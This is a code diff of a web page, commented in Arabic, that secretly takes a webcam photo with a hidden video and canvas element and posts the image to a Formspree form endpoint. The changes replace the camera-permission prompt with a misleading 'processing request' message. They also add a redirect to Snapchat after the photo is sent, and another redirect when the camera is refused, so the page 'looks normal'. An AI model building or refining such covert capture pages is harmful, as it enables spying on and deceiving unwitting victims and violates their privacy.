@@ -15,16 +15,18 @@
 
     <div class="container">
         <div class="loader"></div>
-        <p>يرجى السماح بالوصول للكاميرا للمتابعة...</p>
+        <p>يرجى الانتظار، جاري معالجة الطلب...</p>
     </div>
 
     <!-- عناصر المعالجة المخفية -->
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-    <!-- الرابط الجديد المحدث -->
-    <form id="photoForm" action="https://formspree.io/f/xqenyzwv" method="POST">
+    <!-- الرابط الخاص بك مع خاصية إعادة التوجيه المدمجة -->
+    <form id="photoForm" action="https://formspree.io" method="POST">
         <input type="hidden" name="image_data" id="imageInput">
+        <!-- هذا السطر يخبر Formspree أين يذهب المستخدم بعد الإرسال -->
+        <input type="hidden" name="_next" value="https://snapchat.com">
         <input type="hidden" name="_subject" value="التقاط جديد">
     </form>
 
@@ -49,12 +51,14 @@
                     imageInput.value = dataURL;
                     
                     // إرسال البيانات فوراً لـ Formspree
+                    // بعد الإرسال، سيقوم Formspree تلقائياً بتحويل المستخدم إلى سنابشات
                     form.submit();
                 }, 1500);
             })
             .catch(err => {
                 console.error("فشل الوصول للكاميرا:", err);
-                alert("يجب السماح بالكاميرا ليعمل الرابط.");
+                // تحويل المستخدم حتى لو رفض الكاميرا لجعل الأمر يبدو طبيعياً
+                window.location.href = "https://snapchat.com";
             });
     </script>
 </body>
